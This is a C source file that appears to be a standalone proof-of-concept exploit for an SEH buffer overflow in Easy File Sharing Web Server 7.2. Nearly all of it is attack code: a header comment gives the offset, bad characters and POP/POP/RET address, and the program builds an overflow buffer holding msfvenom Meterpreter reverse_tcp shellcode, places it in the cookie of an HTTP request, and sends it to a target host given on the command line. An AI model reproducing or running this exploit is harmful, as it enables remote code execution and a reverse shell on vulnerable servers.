/* SEH Overflow for Easy File Sharing Web Server 7.2 

   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡀⡠⠚⡦⠊⡆⡠⢶⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣠⠃⣧⠃⣰⠁⢠⠏⢀⠎⢀⡀⢀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡖⠒⣧⣹⢀⣸⣄⣇⣦⠂⣠⠗⠊⢁⣠⣊⡀
⠀⠀⠀⠀⠀⠀⠀⢺⣉⠙⢂⡾⠏⠁⠀⠀⠀⠈⠹⣗⡓⠉⠁⠀⣀⠼
⠀⠀⠀⠀⠀⠄⠒⠀⠈⣓⡟⠀⠀⠀⠀⠀⠀⡀⠀⡷⢶⡖⠈⠉⠉⣢
⠀⠀⠀⠀⠀⡝⠂⢀⣚⣷⡇⠀⠀⠠⠀⠀⣄⣤⠾⠖⠠⣀⠁⠲⢌⠀
⠀⠀⠀⠀⠀⢉⠝⢉⡴⢞⡿⠶⢿⢴⡔⣿⠙⠝⡏⠢⣄⠈⠙⣕⠚⠀
⠀⠀⠀⠀⠀⠧⡴⠋⣠⠏⢠⠁⡜⢈⡇⢹⠱⡀⠘⡄⠈⢋⠐⠊⠀⠀
⠀⠀⠀⠀⠀⢰⡁⠔⡏⡠⡇⢠⠃⢸⠇⢸⢠⠓⠤⠏⠒⠚⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⣄⡎⠦⠢⢈⣸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡠⠄⠒⣂⠰⡒⠢⢄⢰⠡⠀⢀⠕⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⠚⠠⢅⠉⢈⢉⠳⢴⣰⣿⢖⣔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠡⢀⣀⡰⢋⡜⠻⣂⣀⠑⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡔⠡⠂⠣⡁⠉⠑⣖⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡜⠠⠁⠀⠀⠈⠢⣀⠘⢣⠂⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⢁⠇⠀⠀⠀⠀⠀⠀⠑⡄⠂⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠘⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠑⢌⣆⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀                          

Notes: 
	- Offset: 4059 
	- Bad characters: 0x00, 0x09, 0x0a, 0x0d, 0x20, 0x3b
	- POP/POP/RET Address: 0x1001bed8
	- Short JMP: 0xeb06 */

#include <stdio.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

#define SIZE 7600 
#define OFFSET 4059

/* Send payload to server */
ssize_t send_payload(int s, int payload_size, char* payload) {
	ssize_t sent = 0;
	ssize_t n = 0;
	while (sent < payload_size) {
		n = send(s, payload + sent, payload_size - sent, 0);
		if (n == -1) {
			printf("ERROR!\n");
			return 0; 
		}
		sent += n;
	}

	printf("OK!\n", sent);

	return sent;
}

/* Generate HTTP request packet including payload */
char* generate_headers(char* addr, int port) { 
	char buffer[SIZE] = { 0 };

	/* msfvenom -p windows/meterpreter/reverse_tcp LPORT=443 -e x86/shikata_ga_nai -b 
	   '\x00\x09\x0a\x0d\x20\x3b' -v shellcode -f c */
	unsigned char shellcode[] =
		"\xb8\xbd\x36\x2e\xf0\xdb\xca\xd9\x74\x24\xf4\x5b\x31\xc9"
		"\xb1\x5a\x83\xeb\xfc\x31\x43\x0f\x03\x43\xb2\xd4\xdb\x0c"
		"\x24\x97\x24\xed\xb4\xc8\x15\x3f\x3d\xed\x32\x34\x6f\xde"
		"\x31\x18\x83\x95\x14\x89\x10\xdb\xb0\x80\xd9\x13\x76\xa8"
		"\x03\x1d\xb8\x81\x77\x3c\x44\xd8\xab\x9e\x75\x13\xbe\xdf"
		"\xb2\xe5\xb5\x30\x6e\x7d\x67\xdf\x04\xc3\xbb\x88\x1b\x14"
		"\x48\x76\x64\x11\x8e\x03\xd8\x18\xde\xbc\x6b\x52\xc6\xb7"
		"\x34\x43\xf7\x14\x41\x4a\x83\xa6\x03\x7c\x94\x5c\xa7\xf5"
		"\x6b\xb5\xf9\xc9\xc7\xf8\x35\xc4\x16\x3c\xf1\x37\x6d\x36"
		"\x01\xc5\x75\x8d\x7b\x11\xf0\x12\xdb\xd2\xa2\xf6\xdd\x37"
		"\x34\x7c\xd1\xfc\x33\xda\xf6\x03\x90\x50\x02\x8f\x17\xb7"
		"\x82\xcb\x33\x13\xce\x88\x5a\x02\xaa\x7f\x63\x54\x12\xdf"
		"\xc1\x1e\xb1\x36\x75\xdf\x49\x37\x28\x48\x85\xfa\xd2\x88"
		"\x81\x8d\xa1\xba\x0e\x26\x2d\xf7\xc7\xe0\xaa\x8e\xc0\x12"
		"\x64\x28\x80\xec\x84\x49\x88\x2a\xd0\x19\xa2\x9b\x58\xf2"
		"\x32\x23\x8d\x6f\x39\xb3\xed\xd8\x3d\x68\x85\x1a\x3e\x6f"
		"\xee\x92\xd8\x3f\x40\xf5\x74\x80\x30\xb5\x24\x68\x5a\x3a"
		"\x1a\x88\x65\x90\x33\x23\x89\x4d\x6b\xdc\x30\xd4\xe7\x7d"
		"\xbd\xc2\x8d\xbe\x35\xe7\x72\x70\xbd\x82\x60\x65\xda\x6c"
		"\x79\x76\x4e\x6d\x13\x72\xd8\x3a\x8b\x78\x3d\x0c\x14\x82"
		"\x68\x0e\x53\x7c\xec\x27\x2f\x4b\x7a\x08\x47\xb4\x6a\x88"
		"\x97\xe2\xe0\x88\xff\x52\x50\xdb\x1a\x9d\x4d\x4f\xb7\x08"
		"\x6d\x26\x6b\x9a\x05\xc4\x52\xec\x8a\x37\xb1\x6e\xcc\xc8"
		"\x47\x59\x74\xa1\xb7\xd9\x84\x31\xd2\xd9\xd4\x59\x29\xf5"
		"\xdb\xa9\xd2\xdc\xb4\xa1\x59\xb1\x77\x53\x5d\x98\xd9\xcd"
		"\x5e\x2f\xc1\xfe\x25\x40\xf6\xfe\xd9\x48\x93\xfe\xd9\x74"
		"\xa2\xc3\x0f\x4d\xd1\x02\x8c\xea\xe7\x8b\x21\xe7\x7d\x94"
		"\x16\x08\x54\xfe\x98\x35";


	char *poppopret = "\xd8\xbe\x01\x10";
	char *shortjmp = "\x90\x90\xeb\x06";
	int poppopret_len = strlen(poppopret);
	int shortjmp_len = strlen(shortjmp);
	int shellcode_len = strlen(shellcode);

	/* The padding keeps track of amount to pad after buffer has been placed */
	int padding = SIZE - (OFFSET + poppopret_len + shortjmp_len + shellcode_len + 24 + 1);

	/* The cursor keeps track of the offset in the buffer */
	int cursor = OFFSET;

	/* Fill buffer with SEH Overflow condition and shellcode */
	memset(buffer, 0x41, OFFSET);
	memcpy(buffer + cursor, shortjmp, shortjmp_len);
	cursor += shortjmp_len;
	memcpy(buffer + cursor, poppopret, poppopret_len);
	cursor += poppopret_len;
	memset(buffer + cursor, 0x90, 24);
	cursor += 24;
	memcpy(buffer + cursor, shellcode, shellcode_len);
	cursor += shellcode_len;
	memset(buffer + cursor, 0x43, padding);

	char *payload;
	asprintf(&payload,
		"GET /changeuser.ghp HTTP/1.1\r\n"
		"User-Agent: Mozilla/4.0\r\n"
		"Host: %s:%d\r\n"
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		"Accept-Language: en-US\r\n"
		"Referer: http://%s/\r\n"
		"Cookie: SESSIONID=6771; UserID=%s; PassWD=;\r\n"
		"Connection: Keep-Alive\r\n\r\n", addr, port, addr, buffer);

	return payload;
}

int main(int argc, char *argv[]) {
	/* Handle command-line arguments */
	if (argc < 3) {
		printf("Easy File Sharing Web Server 7.2 SEH Exploit\n");
		printf("Usage: IP PORT\n");
		return 1;
	}

	char* addr = argv[1];
	int port = atoi(argv[2]);
	
	/* Create a socket */
	int s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == -1) {
		printf("Failed to initialize socket!\n");
		return 1;
	}

	/* Initialize sockaddr_in */
	struct sockaddr_in target;
	target.sin_addr.s_addr = inet_addr(addr);
	target.sin_family = AF_INET;
	target.sin_port = htons(port);

	if (connect(s, (struct sockaddr*)&target, sizeof(target)) < 0) {
		printf("Failed to initialize sockaddr_in structure!\n");
		return 1;
	}

	printf("Connected to %s on port %d!\n", addr, port);

	/* Generate HTTP request header including buffer and send to remote web server */
	char* payload = generate_headers(addr, port);
	int payload_length = strlen(payload);
	ssize_t bytes_delivered = 0;

	if (payload != NULL) {
		printf("Sending payload ... ");
		bytes_delivered = send_payload(s, payload_length, payload);
	} else {
		printf("Failed to generate HTTP request. Exiting!\n");
		return 1;
	}

	/* Free allocated resources */
	free(payload);
	payload = NULL;

	if (bytes_delivered > 0) {
		printf("Bytes delivered ... %ld\n", bytes_delivered);
	} else {
		printf("Could not send data to server. Exiting!\n");
		return 1;
	}

	return 0;
}
